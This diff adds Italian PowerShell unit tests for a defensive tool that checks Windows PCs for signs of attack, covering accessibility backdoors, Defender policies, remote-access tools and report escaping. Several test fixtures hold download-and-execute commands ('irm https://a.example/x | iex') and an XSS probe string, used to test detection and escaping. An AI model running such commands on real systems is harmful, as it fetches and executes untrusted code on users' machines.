@@ -211,13 +211,113 @@ $script:Findings.Clear()
 Add-AutorunRow $rowsA 'Registro Run' 'HKLM' 'OneDrive' '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background'
 Assert 'Avvio automatico normale = nessun allarme' { $script:Findings.Count -eq 0 }
 
+Write-Host "`n== Nuovi controlli ==" -ForegroundColor Cyan
+$sys = Join-Path $tmp 'System32'
+New-Item -ItemType Directory -Path $sys -Force | Out-Null
+Set-Content -LiteralPath (Join-Path $sys 'cmd.exe') -Value 'SHELL-FINTA'
+Set-Content -LiteralPath (Join-Path $sys 'osk.exe') -Value 'TASTIERA-ORIGINALE'
+$bd0 = @(Find-AccessibilityBackdoor -SysDir $sys)
+Assert 'Accessibilita'': file originali = nessun allarme' { $bd0.Count -eq 0 }
+Copy-Item -LiteralPath (Join-Path $sys 'cmd.exe') -Destination (Join-Path $sys 'sethc.exe')
+$bd1 = @(Find-AccessibilityBackdoor -SysDir $sys)
+Assert 'Accessibilita'': sethc.exe identico a cmd.exe = rilevato' { $bd1.Count -eq 1 -and $bd1[0].File -like '*sethc.exe' -and $bd1[0].UgualeA -like '*cmd.exe' }
+Assert 'Accessibilita'': cartella inesistente = nessun errore' { @(Find-AccessibilityBackdoor -SysDir (Join-Path $tmp 'manca')).Count -eq 0 }
+Assert 'Accessibilita'': senza shell di confronto = nessun allarme' { @(Find-AccessibilityBackdoor -SysDir $sys -ShellPaths @((Join-Path $sys 'nessuna.exe'))).Count -eq 0 }
+Assert 'Defender bloccato da criterio = CRITICO' { (Get-DefenderPolicyState 1 $null) -eq 'CRITICO' -and (Get-DefenderPolicyState $null 1) -eq 'CRITICO' }
+Assert 'Defender senza criteri di blocco = OK' { (Get-DefenderPolicyState $null $null) -eq 'OK' -and (Get-DefenderPolicyState 0 0) -eq 'OK' }
+Assert 'Piano di analisi: almeno 24 controlli con nomi file unici' { $pl = @(Get-CollectPlan); $pl.Count -ge 24 -and @($pl | ForEach-Object { $_[1] } | Select-Object -Unique).Count -eq $pl.Count }
+Assert 'System32 = rischio 0' { (Get-PathRisk 'C:\Windows\System32\svchost.exe') -eq 0 }
+Assert 'Dominio banca riconosciuto anche come sottodominio' { Test-BankHost 'https://online.relaxbanking.it/*' $bank }
+Assert 'Altro dominio non scambiato per la banca' { -not (Test-BankHost 'https://www.google.com/*' $bank) }
+
+Write-Host "`n== Raggruppamento (niente righe ripetute) ==" -ForegroundColor Cyan
+$script:Findings.Clear()
+Add-PsHistoryFindings 'Mario' @(
+    [pscustomobject]@{ Comando = 'irm https://a.example/x | iex'; Rischio = 'MEDIA' }
+    [pscustomobject]@{ Comando = 'irm https://b.example/y | iex'; Rischio = 'MEDIA' }
+    [pscustomobject]@{ Comando = 'irm https://a.example/x | iex'; Rischio = 'MEDIA' }
+    [pscustomobject]@{ Comando = 'iex (iwr https://c.example/z)'; Rischio = 'MEDIA' }
+)
+$ph = @($script:Findings | Where-Object { $_.Categoria -eq 'ClickFix' })
+Assert 'Cronologia PowerShell: una sola riga per utente con il numero di comandi' { $ph.Count -eq 1 -and $ph[0].Titolo -like '3 comandi PowerShell sospetti*Mario' -and $ph[0].Dettaglio -like '*b.example*' }
+$script:Findings.Clear()
+Add-PsHistoryFindings 'Mario' @([pscustomobject]@{ Comando = 'x | iex'; Rischio = 'MEDIA' }, [pscustomobject]@{ Comando = 'y | iex'; Rischio = 'ALTA' })
+Assert 'Cronologia PowerShell: prevale la gravita'' piu'' alta' { $script:Findings.Count -eq 1 -and $script:Findings[0].Gravita -eq 'ALTA' }
+$script:Findings.Clear()
+Add-PsHistoryFindings 'Mario' @()
+Assert 'Cronologia PowerShell pulita = nessuna riga' { $script:Findings.Count -eq 0 }
+$script:Findings.Clear()
+Add-RemoteToolFindings @(
+    [pscustomobject]@{ Tipo = 'Processo'; Nome = 'remoting_host.exe'; Dettaglio = 'C:\Program Files (x86)\Google\Chrome Remote Desktop\remoting_host.exe'; Note = '' }
+    [pscustomobject]@{ Tipo = 'Installato'; Nome = 'Chrome Remote Desktop Host'; Dettaglio = 'Google LLC'; Note = '' }
+    [pscustomobject]@{ Tipo = 'Servizio'; Nome = 'Chrome Remote Desktop Service'; Dettaglio = '"C:\Program Files (x86)\Google\Chrome Remote Desktop\remoting_host.exe" --type=daemon'; Note = '' }
+)
+Assert 'Chrome Remote Desktop: una sola riga anche con nomi diversi' { $script:Findings.Count -eq 1 -and $script:Findings[0].Titolo -like '*Chrome Remote Desktop Host' }
+Assert 'Nomi alternativi dei programmi remoti unificati' { (Get-RemoteToolName 'client32.exe') -eq 'netsupport' -and (Get-RemoteToolName 'AnyDesk') -eq 'anydesk' }
+$script:Findings.Clear()
+
+Write-Host "`n== Giudizio finale ==" -ForegroundColor Cyan
+$script:Findings.Clear(); $script:Sections.Clear(); $script:Hardening = @()
+$s0 = Get-RunSummary
+Assert 'PC pulito: messaggio chiaro e punteggio pieno' { $s0.Messaggio -eq 'Nessun segno di attacco trovato.' -and $s0.Punteggio -eq 100 }
+Add-Finding 'MEDIA' 'Test' 'AnyDesk installato' 'd' 'a'
+$s1 = Get-RunSummary
+Assert 'Solo "da controllare": nessun problema confermato' { $s1.Media -eq 1 -and $s1.Alta -eq 0 -and $s1.Messaggio -like 'Nessun problema confermato*' }
+Add-Finding 'ALTA' 'Test' 'IBAN sostituito' 'd' 'a'
+$s2 = Get-RunSummary
+Assert 'Problema confermato: avviso di non usare il PC per la banca' { $s2.Alta -eq 1 -and $s2.Messaggio -like '*Non usarlo per la banca*' -and $s2.Punteggio -le 49 }
+$script:Findings.Clear()
+$script:Hardening = @([pscustomobject]@{ Area = 'Rete'; Controllo = 'Firewall'; Stato = 'CRITICO'; Valore = 'spento'; Consiglio = '' })
+Assert 'Impostazione sbagliata: segnalata come da correggere, non come attacco' { $s3 = Get-RunSummary; $s3.Critici -eq 1 -and $s3.Alta -eq 0 -and $s3.Messaggio -like '*da correggere*' }
+$script:Hardening = @()
+for ($i = 1; $i -le 10; $i++) { $st = 'Non disponibile'; if ($i -le 3) { $st = 'OK' }; $script:Sections.Add([pscustomobject]@{ Sezione = "S$i"; Stato = $st; Righe = 0; Secondi = 0; File = ''; Errore = '' }) }
+$s4 = Get-RunSummary
+Assert 'Meno dell''80% dei controlli: "Analisi incompleta", mai "tutto a posto"' { $s4.Incompleta -and $s4.Giudizio -eq 'Analisi incompleta' -and $s4.Messaggio -like '*Analisi incompleta*' }
+$script:Sections.Clear()
+for ($i = 1; $i -le 10; $i++) { $st = 'OK'; if ($i -eq 10) { $st = 'Non disponibile' }; $script:Sections.Add([pscustomobject]@{ Sezione = "S$i"; Stato = $st; Righe = 0; Secondi = 0; File = ''; Errore = '' }) }
+Assert 'Con il 90% dei controlli l''analisi e'' completa' { -not (Get-RunSummary).Incompleta }
+$script:Sections.Clear()
+$hr = New-Object 'System.Collections.Generic.List[object]'
+Add-HardeningRow $hr 'Credenziali' 'WDigest' 'CRITICO' 'attivo' 'riportarlo a 0' 'MEDIA'
+Assert 'Impostazione con segnalazione: riga di configurazione + elemento da controllare' { $hr.Count -eq 1 -and @($script:Findings | Where-Object { $_.Categoria -eq 'Configurazione' -and $_.Gravita -eq 'MEDIA' }).Count -eq 1 }
+$script:Findings.Clear()
+$script:Config = Import-CyberConfig $cfgFile
+$script:Config['AllowPaths'] = @('C:\Programmi\Assistenza\')
+$script:Config['AllowCertThumbprints'] = @('AB CD EF')
+Assert 'Cartella autorizzata riconosciuta (anche maiuscole/minuscole)' { Test-Allowed 'c:\programmi\assistenza\tool.exe' 'path' }
+Assert 'Certificato autorizzato riconosciuto (spazi ignorati)' { Test-Allowed 'ABCDEF' 'cert' }
+Assert 'Elemento non autorizzato resta segnalato' { -not (Test-Allowed 'C:\Users\Mario\AppData\x.exe' 'path') }
+$script:Config = $null
+
+Write-Host "`n== Testi per il cliente ==" -ForegroundColor Cyan
+$at = $null; $ae = $null
+$astMain = [System.Management.Automation.Language.Parser]::ParseFile($main, [ref]$at, [ref]$ae)
+$calls = @($astMain.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] -and $n.GetCommandName() -eq 'Add-Finding' }, $true))
+$texts = @(foreach ($c in $calls) { foreach ($e in $c.CommandElements) { if ($e -is [System.Management.Automation.Language.StringConstantExpressionAst] -or $e -is [System.Management.Automation.Language.ExpandableStringExpressionAst]) { [string]$e.Value } } })
+Assert 'Segnalazioni presenti nel codice (piu'' di 60)' { $calls.Count -gt 60 }
+$long = @($texts | Where-Object { $_.Length -gt 220 })
+Assert 'Testi brevi: nessun titolo o consiglio oltre 220 caratteri' { if ($long.Count) { $long | ForEach-Object { Write-Host "      troppo lungo: $($_.Substring(0, 60))..." -ForegroundColor DarkYellow } }; $long.Count -eq 0 }
+Assert 'Niente gergo inglese nei testi (infostealer, fileless, man-in-the-browser)' { @($texts | Where-Object { $_ -match '(?i)infostealer|fileless|man-in-the-browser|dump della memoria' }).Count -eq 0 }
+$ui = [IO.File]::ReadAllText((Join-Path (Join-Path (Split-Path $here -Parent) 'ui') 'index.html'))
+Assert 'Interfaccia senza risorse esterne' { $ui -notmatch '(?i)(src|href)\s*=\s*"https?:' -and $ui -notmatch '(?i)@import|url\(\s*["'']?https?:' }
+Assert 'Interfaccia con le stesse etichette del rapporto' { $ui -like '*CONFERMATO*' -and $ui -like '*DA CONTROLLARE*' -and $ui -like '*DA CORREGGERE*' -and $ui -like '*DETTAGLIO*' }
+Assert 'Interfaccia con CSP (nonce) per gli script' { $ui -like '*nonce="__NONCE__"*' }
+$cj = Read-JsonFile (Join-Path (Join-Path (Split-Path $here -Parent) 'config') 'config.json')
+Assert 'config.json valido con il dominio della banca' { $null -ne $cj -and @(ConvertTo-StrArray $cj['BankDomains']) -contains 'relaxbanking.it' }
+
 Write-Host "`n== Report HTML ==" -ForegroundColor Cyan
 $script:Findings.Clear()
+$hEmpty = Join-Path $tmp 'vuoto.html'
+Write-HtmlReport $hEmpty
+$hte = [IO.File]::ReadAllText($hEmpty)
+Assert 'Report di PC pulito: "Nessun problema trovato" e guida alla lettura' { $hte -like '*Nessun problema trovato.*' -and $hte -like '*Come leggere il rapporto*' -and $hte -like '*Nessun segno di attacco trovato.*' }
+Assert 'Report senza risorse esterne' { $hte -notmatch '(?i)(src|href)\s*=\s*"https?:' }
 Add-Finding 'ALTA' 'Test' 'Titolo <script>alert(1)</script>' 'dettaglio & "virgolette"' 'consiglio'
 $html = Join-Path $tmp 'r.html'
 Write-HtmlReport $html
 $ht = [IO.File]::ReadAllText($html)
 Assert 'Report HTML creato con punteggio' { $ht -like '*<!doctype html>*' -and $ht -like '*ALTA*' -and $ht -like '*su 100*' }
+Assert 'Report: problema mostrato come CONFERMATO' { $ht -like '*>CONFERMATO</span>*' }
 Assert 'Testo nel report correttamente codificato (niente HTML iniettato)' { $ht -notlike '*<script>alert(1)*' -and $ht -like '*&lt;script&gt;*' }
 
 if (-not $SkipFullRun) {
